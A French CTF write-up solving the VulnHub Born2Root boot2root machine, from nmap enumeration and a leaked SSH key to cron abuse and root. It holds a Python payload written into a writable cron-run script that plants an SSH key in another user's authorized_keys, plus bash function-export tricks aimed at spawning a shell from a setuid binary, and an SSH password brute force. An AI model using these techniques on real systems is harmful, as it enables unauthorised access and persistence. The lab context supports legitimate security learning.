# Solution du CTF Born2Root: 1 de VulnHub

[Born2Root](https://www.vulnhub.com/entry/born2root-1,197/) est un boot2root créé par [Hadi Mene](https://twitter.com/h4d3sw0rm) et disponible sur VulnHub.  

La présentation de ce CTF indique que l'énumération est la clé, alors gardons précieusement dans un Kate (ou Vim ou autre mais pas de Emacs ou de Nano svp, toi même tu sais...)  

Les clés sous le paillasson
---------------------------

```plain
Nmap scan report for 192.168.2.3
Host is up (0.00059s latency).
Not shown: 65509 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 3d:6f:40:88:76:6a:1d:a1:fd:91:0f:dc:86:b7:81:13 (DSA)
|   2048 eb:29:c0:cb:eb:9a:0b:52:e7:9c:c4:a6:67:dc:33:e1 (RSA)
|_  256 d4:02:99:b0:e7:7d:40:18:64:df:3b:28:5b:9e:f9:07 (ECDSA)
60/tcp    filtered unknown
80/tcp    open     http    Apache httpd 2.4.10 ((Debian))
| http-robots.txt: 2 disallowed entries
|_/wordpress-blog /files
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title:  Secretsec Company
111/tcp   open     rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          53796/tcp  status
|_  100024  1          58298/udp  status
6795/tcp  filtered unknown
9510/tcp  filtered unknown
11856/tcp filtered unknown
13899/tcp filtered unknown
16062/tcp filtered unknown
19363/tcp filtered unknown
19532/tcp filtered unknown
19857/tcp filtered unknown
24910/tcp filtered unknown
25625/tcp filtered unknown
25691/tcp filtered unknown
34053/tcp filtered unknown
36313/tcp filtered unknown
37263/tcp filtered unknown
39941/tcp filtered unknown
40694/tcp filtered unknown
45002/tcp filtered unknown
45800/tcp filtered unknown
50162/tcp filtered unknown
53796/tcp open     status  1 (RPC #100024)
57783/tcp filtered unknown
62511/tcp filtered unknown
MAC Address: 08:00:27:84:43:C4 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

La page d'index du site fait mention d'une entreprise fictive nommée *Secretsec* et basée en France.  

Il y a trois noms de contacts qui pourraient éventuellement s'avérer utile :  

```plain
Martin N
Hadi M
Jimmy S
```

En ce qui concerne les dossiers indiqués dans le robots.txt :  

* Le dossier /files a le listing activé et aucun fichier n'est présent à l'intérieur.
* Le dossier /wordpress-blog nous donne juste un trollface...

Pas un bon début :p  

Finalement en fouillant dans les dossiers classiques d'une installation *Apache* on trouve un fichier texte qui contient une clé privée SSH : */icons/VDSoyuAXiO.txt*.  

Cette clé nous permet d'accéder au compte *martin* du système :  

```plain
$ ssh -i VDSoyuAXiO.txt martin@192.168.2.3

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar  3 11:04:30 2018 from 192.168.2.240

READY TO ACCESS THE SECRET LAB ?

secret password : secretsec
WELCOME !
martin@debian:~$ id
uid=1001(martin) gid=1001(martin) groupes=1001(martin)
```

J'ai entré *secretsec* comme mot de passe car c'est la première chose qui m'est venu mais n'importe quel mot de passe aurait été accepté (en raison de la condition OR dans le script, d'ailleurs il manquerait aussi un appel à strip()) :  

```python
#!/usr/bin/python

import os

print("")
print("READY TO ACCESS THE SECRET LAB ? ")
print("")
password = raw_input("secret password : ")

if (password) == "secretsec" or "secretlab" :
        print("WELCOME ! ")
else:
        print("GET OUT ! ")
        os.system("pkill -u 'martin'")
```

Le script en question est */var/tmp/login.py* et il est appelé à la fin du *.bashrc* (il aurait été possible de le bypasser dans tous les cas).  

On retrouve les deux autres utilisateurs sur le système :  

```plain
uid=1002(jimmy) gid=1002(jimmy) groupes=1002(jimmy)
uid=1000(hadi) gid=1000(hadi) groupes=1000(hadi),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

Jimmy tourne en rond
--------------------

Via les process on voit que cron et atd tournent sur le système, ainsi qu'un Exim. Notre utilisateur *martin* ne dispose d'aucune entrée cron ni atq, ni email sur le système. A noter aussi que sudo n'est pas présent.  

L'utilisateur *jimmy* a lui une spool de mails :  

```plain
-rw-rw---- 1 jimmy mail 18827 mars   3 11:15 /var/mail/jimmy
```

Mais le plus intéressant c'est son entrée dans */etc/crontab* :  

```plain
*/5   * * * *   jimmy   python /tmp/sekurity.py
```

Le fichier n'existant pas on peut facilement exécuter des commandes pour s'ouvrir un accès :  

```python
import os
os.system("mkdir -p /home/jimmy/.ssh/")
os.system("echo ssh-rsa ma_cle_prive_ssh >> /home/jimmy/.ssh/authorized_keys")
os.system("chmod 600 /home/jimmy/.ssh/authorized_keys")
```

Fake news
---------

Une fois connecté en tant que *jimmy* on découvre un binaire setuid root dans le dossier personnel :  

```plain
jimmy@debian:~$ ls -l networker
-rwsrwxrwx 1 root root 7496 juin   9  2017 networker
jimmy@debian:~$ ./networker
*** Networker 2.0 ***
eth0      Link encap:Ethernet  HWaddr 08:00:27:84:43:c4
          inet adr:192.168.2.3  Bcast:192.168.2.255  Masque:255.255.255.0
          adr inet6: fe80::a00:27ff:fe84:43c4/64 Scope:Lien
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1590609 errors:4947 dropped:0 overruns:0 frame:0
          TX packets:1591448 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 lg file transmission:1000
          RX bytes:268590018 (256.1 MiB)  TX bytes:522000199 (497.8 MiB)
          Interruption:9 Adresse de base:0xd020

lo        Link encap:Boucle locale
          inet adr:127.0.0.1  Masque:255.0.0.0
          adr inet6: ::1/128 Scope:Hôte
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:27 errors:0 dropped:0 overruns:0 frame:0
          TX packets:27 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 lg file transmission:0
          RX bytes:5634 (5.5 KiB)  TX bytes:5634 (5.5 KiB)

PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.028 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.028/0.028/0.028/0.000 ms
Done
echo linux tool version 5
```

Un strings sur ce binaire remonte notamment les chaînes suivantes :  

```plain
*** Networker 2.0 *** 
/sbin/ifconfig
/bin/ping -c 1  localhost 
Done 
echo 'echo linux tool version 5'
```

Ici les deux exécutables appelés à travers la fonction *system()* de la libc le sont via leur path complet donc pas d'attaque possible sur le PATH.  

Le binaire est certes accessible en lecture mais le kernel / la libc [ne sont pas bêtes](https://unix.stackexchange.com/questions/284947/why-suid-bit-is-unset-after-file-modification) et le flag setuid serait retiré si on tentait de modifier le binaire (même si on conserve la même inode).  

L'ordre de résolution des commandes de bash est le suivant d'après la page de manuel :  

> **Path Search**  
> 
> When locating a command, the shell first looks to see if it has a shell function by that name.  
> 
> Then it looks for a builtin command by that name. If a builtin command is not found, one of two things happen:  
> 
> 1. Command names containing a slash are simply executed without performing any searches.
> 2. The shell searches each entry in PATH in turn for the command. The value of the PATH variable should be a series of entries separated by colons.  
> 
>  Each entry consists of a directory name. The current directory may be indicated implicitly by an empty directory name, or explicitly by a single period.
> 

On peut tenter d'utiliser la technique que certains ont utilisé sur le CTF [Sleepy](http://devloop.users.sourceforge.net/index.php?article138/solution-du-ctf-dev-random-sleepy-de-vulnhub) et d'exporter des fonctions du nom de ces commandes :  

```plain
/sbin/ifconfig() { /bin/sh; }; export -f /sbin/ifconfig
/sbin/ifconfig () { /bin/sh; }; export /sbin/ifconfig
echo () { /bin/dash; }; export echo
function /sbin/ifconfig() { /bin/sh; }; export -f /sbin/ifconfig
```

Mais aucune de ces commandes n'a fonctionné.  

Si on récupère [un script de détection de la faille Shellshock](https://github.com/wreiske/shellshocker) ce dernier ne se montre pas convaincant...  

```plain
jimmy@debian:~$ ./shellshock_test.sh
CVE-2014-6271 (original shellshock): not vulnerable
CVE-2014-6277 (segfault): not vulnerable
CVE-2014-6278 (Florian's patch): not vulnerable
CVE-2014-7169 (taviso bug): not vulnerable
CVE-2014-7186 (redir_stack bug): not vulnerable
CVE-2014-7187 (nested loops off by one): not vulnerable
CVE-2014-//// (exploit 3 on http://shellshocker.net/): not vulnerable
```

A ce point là il est intéressant de se pencher sur les versions de la libc et de bash, trouvables via dpkg :  

```plain
ii  bash                          4.3-11+deb8u1                      i386         GNU Bourne Again SHell
ii  libc-bin                      2.19-18+deb8u7                     i386         GNU C Library: Binaries
```

La page de manuel de [ld.so(8)](http://man7.org/linux/man-pages/man8/ld.so.8.html) contient des notes importantes relatif au *Secure-execution mode* qui peuvent indiquer la présence d'un correctif pour certaines versions.  

On en déduit malheureusement que la version du système n'est pas vulnérables aux failles LD\_AUDIT / ORIGIN...  

Bash étant dans sa version 4.3 ça vaut le coup d'utiliser le même exploit que pour le CTF [K2](http://devloop.users.sourceforge.net/index.php?article154/solution-du-ctf-dev-random-k2-de-vulnhub) qui utilise xtrace et PS4... mais sans succès.  

Il faut dire que sous Debian /bin/sh redirige vers /bin/dash qui est grosso-modo un bash allégé :  

```plain
lrwxrwxrwx 1 root root 4 nov.   8  2014 /bin/sh -> dash
```

C'est une caractéristique de Debian parfois critiquée car dash ne droppe pas ses privilèges contrairement à bash... Mais dans notre cas il semble que si dash est allégé, il l'est aussi de certaines vulnérabilités :(  

Kansas City Shuffle
-------------------

Finalement si on applique quelques règles de base de permutation avec un brute force SSH on obtient un shell avec les identifiants *hadi* / *hadi123*.  

A partir de là on fait un *su* avec le même mot de passe qui permet alors de passer root et d'obtenir le flag :  

```plain
root@debian:~# cat flag.txt

,-----.                         ,---. ,------.                 ,--.
|  |) /_  ,---. ,--.--.,--,--, '.-.  \|  .--. ' ,---.  ,---. ,-'  '-.
|  .-.  \| .-. ||  .--'|      \ .-' .'|  '--'.'| .-. || .-. |'-.  .-'
|  '--' /' '-' '|  |   |  ||  |/   '-.|  |\  \ ' '-' '' '-' '  |  |
`------'  `---' `--'   `--''--''-----'`--' '--' `---'  `---'   `--'

Congratulations ! you  pwned completly Born2root's CTF .

I hope you enjoyed it and you have made Tea's overdose or coffee's overdose :p

I have blocked some easy ways to complete the CTF ( Kernel Exploit ... ) for give you more fun and more knownledge ...

Pwning the box with a linux binary misconfiguration is more fun than with a Kernel Exploit !

Enumeration is The Key .

Give me feedback :[FB] Hadi Mene
```

Finish line
-----------

Ce CTF se finit un peu en eau de boudin avec une solution qui montre peu d'intérêt et des épreuves visiblement buggés. Le second opus est en cours de création d'après son auteur.

*Published March 13 2018 at 18 35*